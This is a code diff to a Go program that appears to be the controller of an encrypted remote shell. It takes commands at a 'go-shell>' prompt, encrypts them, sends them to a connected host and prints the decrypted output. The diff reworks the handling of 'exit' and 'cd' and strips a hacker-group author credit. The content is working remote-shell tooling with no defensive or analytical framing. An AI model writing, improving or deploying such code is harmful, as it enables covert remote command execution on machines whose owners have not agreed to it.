@@ -1,5 +1,5 @@
 package main
-// coded by s1ege greetz to all gsh members
+
 import (
   "bufio"
   "net"
@@ -28,19 +28,19 @@ func main() {
         reader := bufio.NewReader(os.Stdin)
         red.Print("go-shell> ")
         command, _ := reader.ReadString('\n')
-        if strings.Compare(command, "exit") == 0 {
-            enc_command := encryption(true, key, command)
-
+        enc_command := encryption(true, key, command)
+        if strings.Index(command, "exit") == 0 {
             conn.Write([]byte(enc_command))
             conn.Close()
             os.Exit(0)
+        } else if strings.Index(command, "cd") == 0 {
+            conn.Write([]byte(enc_command))
 
         } else {
-              enc_command := encryption(true, key, command)
-              conn.Write([]byte(enc_command))
-              enc_output, _ := bufio.NewReader(conn).ReadString('\n')
-              dec_output := encryption(false, key, string(enc_output))
-              green.Println(string(dec_output))
+            conn.Write([]byte(enc_command))
+            enc_output, _ := bufio.NewReader(conn).ReadString('\n')
+            dec_output := encryption(false, key, string(enc_output))
+            green.Println(string(dec_output))
         }
     }
 }
